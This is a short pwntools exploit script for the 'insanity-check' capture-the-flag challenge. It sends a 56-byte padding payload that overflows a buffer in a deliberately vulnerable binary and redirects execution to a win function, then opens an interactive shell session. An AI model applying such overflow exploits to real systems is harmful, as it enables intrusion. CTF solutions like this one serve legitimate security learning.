#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
libc = '/usr/lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'insanity-check.chal.irisc.tf', 10003

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================

        # 0x0000000040000690  _init
        # 0x00000000400006c0  strcpy@plt
        # 0x00000000400006d0  puts@plt
        # 0x00000000400006e0  strlen@plt
        # 0x00000000400006f0  system@plt
        # 0x0000000040000700  fgets@plt
        # 0x0000000040000710  _start
        # 0x0000000040000740  _dl_relocate_static_pie
        # 0x00000000400007f6  rstrip
        # 0x0000000040000842  main
        # 0x000000004000097c  _fini
        # 0x000000006d6f632e  win
        # when unhex-ed, address of win is moc. So basically just push the buffer until RIP is overwritten with .com
def exploit():
    global io
    io = initialize()

    offset = 56
    payload = flat(
        b'A' * offset
    )
    
    io.sendline(payload)
    io.interactive()
    
if __name__ == '__main__':
    exploit()